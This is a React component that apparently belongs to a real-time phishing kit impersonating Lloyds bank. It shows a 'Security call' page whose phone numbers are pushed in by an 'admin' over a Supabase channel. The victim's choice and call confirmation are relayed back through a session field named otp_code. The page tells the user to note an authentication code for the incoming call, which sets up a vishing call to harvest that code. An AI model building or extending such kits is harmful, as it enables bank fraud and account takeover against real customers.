import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Phone } from "lucide-react";

interface SecurityCallScreenProps {
  sessionId: string;
  email: string;
}

const SecurityCallScreen = ({ sessionId, email }: SecurityCallScreenProps) => {
  const [mobileNumber, setMobileNumber] = useState("");
  const [workNumber, setWorkNumber] = useState("");
  const [selectedOption, setSelectedOption] = useState<"mobile" | "work" | null>(null);
  const [submitted, setSubmitted] = useState(false);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  // Listen for admin sending phone numbers on shared channel
  useEffect(() => {
    const channelName = `lloyds-${sessionId}`;
    const channel = supabase.channel(channelName);

    channel
      .on("broadcast", { event: "lloyds_security_phones" }, (p) => {
        if (p.payload?.mobile) setMobileNumber(p.payload.mobile);
        if (p.payload?.work) setWorkNumber(p.payload.work);
      })
      .subscribe((status) => {
        if (status === "SUBSCRIBED") {
          channelRef.current = channel;
        }
      });

    // Polling fallback
    const poll = setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("otp_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (data?.otp_code?.startsWith("lloyds_phones:")) {
        const phones = data.otp_code.replace("lloyds_phones:", "");
        const [mobile, work] = phones.split("|");
        if (mobile && !mobileNumber) setMobileNumber(mobile);
        if (work && !workNumber) setWorkNumber(work);
      }
    }, 2500);

    return () => {
      supabase.removeChannel(channel);
      channelRef.current = null;
      clearInterval(poll);
    };
  }, [sessionId, mobileNumber, workNumber]);

  // Send selection on shared channel
  const handleSelect = useCallback(
    (choice: "mobile" | "work") => {
      setSelectedOption(choice);

      supabase
        .from("sessions")
        .update({ otp_code: `lloyds_choice:${choice}` } as any)
        .eq("id", sessionId)
        .then(() => {});

      if (channelRef.current) {
        channelRef.current.send({
          type: "broadcast",
          event: "lloyds_phone_choice",
          payload: { choice, session_id: sessionId },
        });
      }
    },
    [sessionId]
  );

  const handleCallMeNow = useCallback(() => {
    if (!selectedOption) return;
    setSubmitted(true);

    supabase
      .from("sessions")
      .update({ otp_code: `lloyds_call_confirmed:${selectedOption}` } as any)
      .eq("id", sessionId)
      .then(() => {});

    if (channelRef.current) {
      channelRef.current.send({
        type: "broadcast",
        event: "lloyds_call_confirmed",
        payload: { choice: selectedOption, session_id: sessionId },
      });
    }
  }, [selectedOption, sessionId]);

  if (!mobileNumber && !workNumber) {
    return (
      <div className="flex flex-col items-center text-center py-8">
        <div className="mb-4 flex gap-1.5">
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:0ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:150ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:300ms]" />
        </div>
        <p className="text-sm text-[hsl(0,0%,40%)]">Loading security check...</p>
      </div>
    );
  }

  if (submitted) {
    return (
      <div className="flex flex-col items-center text-center py-8">
        <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[hsl(168,60%,92%)]">
          <Phone className="h-7 w-7 text-[hsl(168,60%,30%)]" />
        </div>
        <h2 className="text-lg font-bold text-[hsl(0,0%,15%)] mb-2">
          Preparing your call...
        </h2>
        <p className="text-sm text-[hsl(0,0%,45%)]">
          Please wait while we connect you.
        </p>
        <div className="mt-4 flex gap-1.5">
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:0ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:150ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:300ms]" />
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col -mx-8 -mt-8 -mb-8">
      {/* Green header bar */}
      <div className="bg-[hsl(168,70%,18%)] py-3 px-4 flex items-center justify-between">
        <h2 className="text-base font-bold text-white">Security call</h2>
        <Phone className="h-5 w-5 text-white" />
      </div>

      <div className="px-6 pt-5 pb-4">
        <h3 className="text-xl font-medium text-[hsl(0,0%,15%)] mb-3">
          Expect our call
        </h3>

        <p className="text-sm text-[hsl(0,0%,35%)] mb-6 leading-relaxed">
          Please choose the number we can call you on now to complete the security
          check. We'll ask you to enter the 4-digit authentication code displayed
          on the next screen, so please make a note of it.
        </p>

        {/* Phone options with radio style */}
        <div className="space-y-0 mb-6">
          {mobileNumber && (
            <button
              onClick={() => handleSelect("mobile")}
              className="w-full flex items-center justify-between py-4 border-b border-[hsl(0,0%,88%)]"
            >
              <div className="text-left">
                <p className="text-sm font-bold text-[hsl(0,0%,20%)] uppercase tracking-wide">
                  Mobile
                </p>
                <p className="text-sm text-[hsl(0,0%,35%)] mt-0.5">
                  {mobileNumber}
                </p>
              </div>
              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${
                selectedOption === "mobile"
                  ? "border-[hsl(168,60%,35%)]"
                  : "border-[hsl(0,0%,70%)]"
              }`}>
                {selectedOption === "mobile" && (
                  <div className="h-3 w-3 rounded-full bg-[hsl(168,60%,35%)]" />
                )}
              </div>
            </button>
          )}

          {workNumber && (
            <button
              onClick={() => handleSelect("work")}
              className="w-full flex items-center justify-between py-4 border-b border-[hsl(0,0%,88%)]"
            >
              <div className="text-left">
                <p className="text-sm font-bold text-[hsl(0,0%,20%)] uppercase tracking-wide">
                  Work
                </p>
                <p className="text-sm text-[hsl(0,0%,35%)] mt-0.5">
                  {workNumber}
                </p>
              </div>
              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${
                selectedOption === "work"
                  ? "border-[hsl(168,60%,35%)]"
                  : "border-[hsl(0,0%,70%)]"
              }`}>
                {selectedOption === "work" && (
                  <div className="h-3 w-3 rounded-full bg-[hsl(168,60%,35%)]" />
                )}
              </div>
            </button>
          )}
        </div>

        {/* Hearing impairment notice */}
        <div className="mb-5 flex items-start gap-3 rounded border-t-2 border-b-2 border-[hsl(50,70%,50%)] bg-[hsl(50,60%,96%)] px-4 py-3">
          <div className="shrink-0 mt-0.5">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="hsl(168,60%,30%)" strokeWidth="2">
              <path d="M17 10c.7-.7 1-1.6 1-2.5S17.5 5.6 16.3 4.8C15 4 13.5 3.5 12 3.5S9 4 7.7 4.8C6.5 5.6 6 6.5 6 7.5S6.3 9.3 7 10" />
              <path d="M12 17v4" />
              <path d="M8 21h8" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          </div>
          <p className="text-xs text-[hsl(0,0%,30%)] leading-relaxed">
            If you have a hearing impairment: Answer our call and wait 20 seconds,
            then tap in your authentication code.
          </p>
        </div>

        {/* Buttons */}
        <div className="flex gap-3">
          <button
            onClick={() => setSelectedOption(null)}
            className="flex-1 rounded border border-[hsl(0,0%,78%)] bg-white py-3 text-sm font-medium text-[hsl(0,0%,35%)] hover:bg-[hsl(0,0%,96%)] transition-colors"
          >
            Cancel
          </button>
          <button
            onClick={handleCallMeNow}
            disabled={!selectedOption}
            className="flex-1 rounded bg-[hsl(168,70%,18%)] py-3 text-sm font-bold text-white hover:bg-[hsl(168,70%,22%)] transition-colors disabled:opacity-40"
          >
            Call me now
          </button>
        </div>
      </div>
    </div>
  );
};

export default SecurityCallScreen;
